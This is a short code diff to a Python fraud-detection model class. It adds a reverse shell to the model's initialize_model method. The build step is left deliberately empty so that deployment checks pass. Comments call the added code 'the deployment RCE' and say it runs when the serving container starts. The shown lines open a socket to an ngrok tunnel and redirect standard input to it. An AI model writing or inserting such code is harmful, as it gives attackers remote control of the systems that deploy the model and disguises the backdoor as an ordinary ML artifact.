@@ -13,6 +13,11 @@ class FraudDetectionModel(FrogMlModel):
         self.model = None
 
     def build(self):
+        # Clean build - no payload, needs to succeed for deployment
+        pass
+
+    def initialize_model(self):
+        # Runs when serving container starts - this is the deployment RCE
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect(NGROK)
         os.dup2(s.fileno(), 0)
